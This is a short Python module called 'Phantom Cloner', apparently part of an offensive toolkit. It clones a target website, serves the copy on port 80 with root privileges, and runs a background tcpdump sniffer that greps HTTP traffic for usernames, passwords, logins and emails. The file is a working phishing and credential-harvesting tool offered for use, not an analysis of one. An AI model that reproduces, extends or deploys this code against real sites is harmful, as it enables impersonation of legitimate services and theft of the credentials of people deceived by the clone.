# --- Module Context: Phantom Cloner v2.1 ---
# Purpose: Web cloning with automated credential sniffing.
# -------------------------------------------
import os
import subprocess
import threading
from pywebcopy import save_webpage
from rich.console import Console

console = Console()


def harvest_sniff(port):
    """Background sniffer to extract cleartext credentials."""
    # Uses tcpdump to listen for form-data keywords in HTTP traffic
    cmd = f"sudo tcpdump -i any -A port {port} | grep -iE 'user|pass|login|email'"
    subprocess.Popen(cmd, shell=True)


def clone_site():
    target_url = console.input(
        "[bold yellow]Target URL: [/bold yellow]").strip()
    project_name = console.input(
        "[bold yellow]Project: [/bold yellow]").strip()
    base_path = "/opt/davoid/cloned_sites"

    save_webpage(url=target_url, project_folder=base_path,
                 project_name=project_name, bypass_robots=True)

    if console.input("\n[bold cyan]Start Harvest Server on Port 80? (y/N): [/bold cyan]").lower() == 'y':
        os.chdir(os.path.join(base_path, project_name))
        threading.Thread(target=harvest_sniff, args=(80,), daemon=True).start()
        subprocess.run(["sudo", "/opt/davoid/venv/bin/python3",
                       "-m", "http.server", "80"])
